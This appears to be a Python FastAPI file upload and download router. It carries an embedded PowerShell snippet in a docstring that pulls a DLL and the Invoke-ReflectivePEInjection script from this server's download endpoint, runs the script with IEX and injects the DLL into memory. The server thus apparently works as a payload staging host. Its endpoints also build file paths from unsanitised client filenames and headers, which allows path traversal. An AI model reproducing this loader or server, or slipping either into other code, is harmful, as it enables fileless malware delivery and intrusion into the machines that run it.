from typing import Annotated
from fastapi import APIRouter, Depends, HTTPException, Request, UploadFile, File, Header
from sqlalchemy.orm import Session
import os
from fastapi.responses import FileResponse
from model.database import get_db


UPLOAD_DIRECTORY = "uploads"
os.makedirs(UPLOAD_DIRECTORY, exist_ok=True)

DOWNLOAD_DIRECTORY = "downloads"
os.makedirs(DOWNLOAD_DIRECTORY, exist_ok=True)

router = APIRouter(
    prefix='/file',
    tags=['file'],
    responses={404: {'description': 'Not Found'}},
)

@router.post("/upload")
async def upload_file(file: UploadFile = File(...), db: Session = Depends(get_db)):
    if not file:
        raise HTTPException(status_code=400, detail="No file uploaded")
    file_location = os.path.join(UPLOAD_DIRECTORY, file.filename)
    print(file_location)
    
    with open(file_location, "wb") as f:
        content = await file.read()
        f.write(content)

    return {"filename": file.filename}

"""
          $url="http://10.125.37.96:8000/api/v1/file/download";
          $wc=New-Object System.Net.WebClient;
          $wc.Headers.add("file","debugger.dll");
          $PBytes = $wc.DownloadData($url);
          $wc1 = New-Object System.net.webclient;
          $wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");
          IEX ($wc1.DownloadString($url));
          Invoke-ReflectivePEInjection -PBytes $PBytes -verbose
"""

@router.post("/download")
async def download_file(file: Annotated[str, Header()], db: Session = Depends(get_db)):
    # 헤더에서 받은 파일명을 기반으로 파일 위치 확인
    file_location = os.path.join(UPLOAD_DIRECTORY, file)
    if not os.path.exists(file_location):
        raise HTTPException(status_code=404, detail="File not found")

    # 파일이 존재하면 해당 파일을 다운로드
    return FileResponse(file_location, filename=file)